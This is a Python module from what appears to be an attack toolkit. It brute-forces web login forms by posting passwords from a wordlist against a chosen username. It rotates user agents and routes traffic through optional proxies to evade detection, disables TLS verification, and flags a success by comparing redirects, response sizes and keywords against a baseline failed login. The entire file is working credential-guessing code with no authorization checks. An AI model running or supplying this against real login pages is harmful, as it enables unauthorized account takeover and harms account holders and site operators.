import requests
import urllib3
from modules.utils import load_wordlist, next_user_agent, make_proxies

urllib3.disable_warnings()


def stream_brute(url, username_field, password_field, username, state,
                 custom_wordlist=None, proxy=None, verify_ssl=False):
    passwords = load_wordlist('passwords.txt', custom_path=custom_wordlist)
    if passwords is None:
        yield {'type': 'error', 'message': 'Wordlist not found — check wordlists/passwords.txt'}
        return

    total = len(passwords)
    found = []

    yield {'type': 'info', 'message': f'Target: {url}'}
    yield {'type': 'info', 'message': f'Username field: {username_field}  |  Password field: {password_field}'}
    yield {'type': 'info', 'message': f'Testing username: {username}  |  Wordlist: {total} passwords'}

    proxies = make_proxies(proxy) if proxy else None

    # Fix #18: rotate user agents; Fix #17: apply proxy
    def _post(data):
        return requests.post(
            url, data=data, timeout=8, verify=verify_ssl,
            allow_redirects=False,
            proxies=proxies,
            headers={'User-Agent': next_user_agent()}
        )

    # Baseline: a clearly wrong login to detect what failure looks like
    try:
        baseline_data = {username_field: '__ct_invalid_9z9__', password_field: '__ct_invalid_9z9__'}
        baseline = _post(baseline_data)
        baseline_len = len(baseline.content)
        baseline_loc = baseline.headers.get('Location', '')
        baseline_status = baseline.status_code
        yield {'type': 'info', 'message': f'Baseline (failed login): HTTP {baseline.status_code}, {baseline_len} bytes'}
    except Exception as e:
        yield {'type': 'error', 'message': f'Cannot reach target: {e}'}
        return

    for i, password in enumerate(passwords):
        try:
            r = _post({username_field: username, password_field: password})

            success = False
            reason = ''

            if r.status_code in (301, 302, 303, 307, 308):
                loc = r.headers.get('Location', '')
                if loc != baseline_loc:
                    success = True
                    reason = f'Redirect → {loc}'

            elif r.status_code == 200:
                # Fix #8: check for Location header on 200 (non-standard but common)
                loc = r.headers.get('Location', '')
                if loc and loc != baseline_loc:
                    success = True
                    reason = f'200 with redirect header → {loc}'
                else:
                    diff = abs(len(r.content) - baseline_len)
                    if diff > 150:
                        body = r.text.lower()
                        ok_words  = ['logout', 'welcome', 'dashboard', 'profile', 'account', 'sign out', 'my account']
                        bad_words = ['invalid', 'incorrect', 'failed', 'wrong password', 'error', 'denied', 'try again']
                        if any(w in body for w in ok_words) and not any(w in body for w in bad_words):
                            success = True
                            reason = f'Response size differs by {diff} bytes; success keywords found'

            if success:
                found.append({'username': username, 'password': password})
                yield {'type': 'found', 'username': username, 'password': password,
                       'status': r.status_code, 'reason': reason}

            if i % 10 == 0 or i == total - 1:
                percent = int((i + 1) / total * 100)
                yield {'type': 'progress', 'percent': percent, 'tried': i + 1, 'total': total, 'current': password}

        except GeneratorExit:
            return
        except Exception as e:
            yield {'type': 'error', 'message': f'Request error: {e}'}
            continue

    yield {'type': 'complete', 'tried': total, 'found': found}
